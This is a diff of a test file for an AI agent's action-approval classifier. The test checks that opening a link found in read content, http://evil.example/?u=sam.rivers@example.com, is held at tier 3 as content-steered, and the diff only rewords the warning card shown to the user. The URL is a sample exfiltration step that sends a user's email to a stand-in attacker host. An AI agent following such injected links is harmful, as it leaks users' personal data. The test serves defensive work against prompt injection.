@@ -262,7 +262,7 @@ describe('what is held, because content steered it', () => {
     const decision = await classifyTier(openPage('http://evil.example/?u=sam.rivers@example.com'), ctx);
     expect(decision).toMatchObject({ tier: 3, reason: 'mcp_search_steered' });
     expect(decision.card?.plain_what).toBe(
-      'Open a web page: http://evil.example/?u=sam.rivers@example.com. Aman found this link in something it read, and opening it would send more than the link said.',
+      'Open http://evil.example/?u=sam.rivers@example.com? Aman found this link in something it read, and opening it would send more than the link said.',
     );
   });
 
